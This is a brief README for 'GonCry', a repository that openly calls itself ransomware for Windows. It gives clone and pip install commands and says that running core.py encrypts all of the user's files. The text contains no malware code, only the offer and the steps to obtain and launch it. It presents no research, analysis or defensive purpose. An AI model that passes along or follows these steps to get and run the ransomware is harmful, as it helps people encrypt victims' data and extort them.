# GonCry
Ransomware for the windows operating system.

## Installation
```
$ git clone https://github.com/vsp0/GonCry.git
$ cd GonCry/
$ pip3 install -r requirements.txt
```
Now you can run `core.py`, but be **careful**, all of your files will be encrypted.
